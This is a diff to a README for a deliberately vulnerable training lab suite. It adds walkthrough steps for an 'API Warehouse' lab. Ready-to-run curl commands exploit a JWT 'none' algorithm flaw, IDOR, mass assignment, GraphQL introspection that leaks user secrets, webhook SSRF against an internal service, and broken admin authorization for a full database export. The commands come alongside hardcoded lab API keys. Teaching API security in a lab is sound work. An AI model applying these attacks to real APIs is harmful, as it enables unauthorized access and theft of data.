@@ -156,6 +156,62 @@ sudo -l
 sudo /bin/bash
 ```
 
+### I. API Hacking, Postman Testing & Secure Mode Verification - API Warehouse (`:8089`)
+The **API Warehouse Lab** provides an interactive platform for testing and hacking modern web APIs across all levels of difficulty:
+
+#### 1. Importing Postman Collection & Swagger Specs
+- **Postman Collection Download**: Visit `http://<UBUNTU_VM_IP>:8089/api/v1/postman-collection` or click "📥 Download Postman Collection" on the API Warehouse Web Console. Import `api_warehouse_postman_collection.json` into Postman to instantly access all endpoints, parameters, and headers.
+- **OpenAPI / Swagger Spec**: Access `http://<UBUNTU_VM_IP>:8089/docs` for interactive Swagger UI or `http://<UBUNTU_VM_IP>:8089/openapi.json`.
+
+#### 2. Authentication Testing (API Keys, Bearer Tokens, HMAC)
+```bash
+# A. Authenticate via X-API-Key Header (Guest vs Admin)
+curl -s -H "X-API-Key: ak_guest_88291029" http://<UBUNTU_VM_IP>:8089/api/v1/inventory
+curl -s -H "X-API-Key: ak_admin_77301948" http://<UBUNTU_VM_IP>:8089/api/v1/inventory
+
+# B. Generate JWT Bearer Token (Standard HS256)
+curl -s -X POST http://<UBUNTU_VM_IP>:8089/api/v1/auth/token \
+     -H "Content-Type: application/json" \
+     -d '{"username": "guest_user", "algorithm": "HS256"}'
+
+# C. Exploit JWT 'none' Algorithm Flaw
+curl -s -X POST http://<UBUNTU_VM_IP>:8089/api/v1/auth/token \
+     -H "Content-Type: application/json" \
+     -d '{"username": "admin_boss", "algorithm": "none"}'
+```
+
+#### 3. BOLA / IDOR, GraphQL & Mass Assignment Hacking
+```bash
+# A. BOLA / IDOR - Fetch Restricted Warehouse Item #3
+curl -s -H "X-API-Key: ak_guest_88291029" http://<UBUNTU_VM_IP>:8089/api/v1/inventory/3
+
+# B. Mass Assignment - Inject restricted flags and custom owner ID
+curl -s -X POST http://<UBUNTU_VM_IP>:8089/api/v1/inventory \
+     -H "Content-Type: application/json" \
+     -H "X-API-Key: ak_guest_88291029" \
+     -d '{"item_code": "SKU-HACK-01", "name": "Unauthorized Armored Drone", "category": "Drones", "quantity": 100, "price": 0.0, "is_restricted": 1, "owner_user_id": 3}'
+
+# C. GraphQL Introspection Query - Discover hidden types and user secrets
+curl -s -X POST http://<UBUNTU_VM_IP>:8089/api/v1/graphql \
+     -H "Content-Type: application/json" \
+     -d '{"query": "{ __schema { types { name } } users { id username role apiKey secretKey email } }"}'
+```
+
+#### 4. Webhook SSRF & Admin Database Export
+```bash
+# A. Webhook SSRF - Register webhook targeting internal services
+curl -s -X POST http://<UBUNTU_VM_IP>:8089/api/v1/webhooks \
+     -H "Content-Type: application/json" \
+     -H "X-API-Key: ak_guest_88291029" \
+     -d '{"target_url": "http://127.0.0.1:9000/api/v1/services", "event_type": "ssrf_test"}'
+
+# B. Broken Function Level Authorization - Export entire warehouse database
+curl -s -H "X-API-Key: ak_auditor_31415926" http://<UBUNTU_VM_IP>:8089/api/v1/admin/export
+```
+
+#### 5. Secure Mode Verification & Security Auditor Diagnostic Key
+In **Secure Mode**, the API strictly validates JWT signatures, enforces rate limiting, blocks query parameter API keys, disables GraphQL introspection, and whitelists webhook domains. Security auditors can verify compliance using the dedicated Auditor Key (`ak_auditor_31415926`).
+
 ---
 
 ## 🚀 Microservices Quickstart Summary
@@ -175,3 +231,4 @@ chmod +x start_labs.sh
 - **🌊 Dadiwoo Wave Chat Lab**: `http://<YOUR_HOST_IP>:8086`
 - **📡 Dadiwoo SNMP Network Lab**: `http://<YOUR_HOST_IP>:8087` (UDP `:16161`)
 - **🔑 Dadiwoo SSH Hacking Lab**: `http://<YOUR_HOST_IP>:8088` (TCP `:2222`)
+- **🏬 Dadiwoo API Warehouse Lab**: `http://<YOUR_HOST_IP>:8089`
